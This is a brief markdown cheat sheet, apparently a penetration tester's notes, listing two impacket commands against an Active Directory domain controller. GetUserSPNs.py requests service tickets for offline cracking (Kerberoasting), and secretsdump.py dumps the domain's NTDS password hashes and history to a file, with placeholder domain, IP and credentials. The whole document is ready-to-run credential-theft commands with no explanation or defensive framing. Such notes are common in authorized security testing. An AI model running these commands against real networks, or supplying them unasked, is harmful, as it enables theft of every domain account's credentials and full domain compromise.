# impacket

## GetUserSPNs.py

``` bash
GetUserSPNs.py -dc-ip 192.168.1.1 contoso.local/jdupond:'P@$$w0rd' -save
```

## secretsdump.py

``` bash
secretsdump.py -just-dc -user-status -history contoso.local/Administrator:'P@$$w0rd'@192.168.1.1 | tee secretsdump_dump_ntds_full_192.168.1.1.txt
```
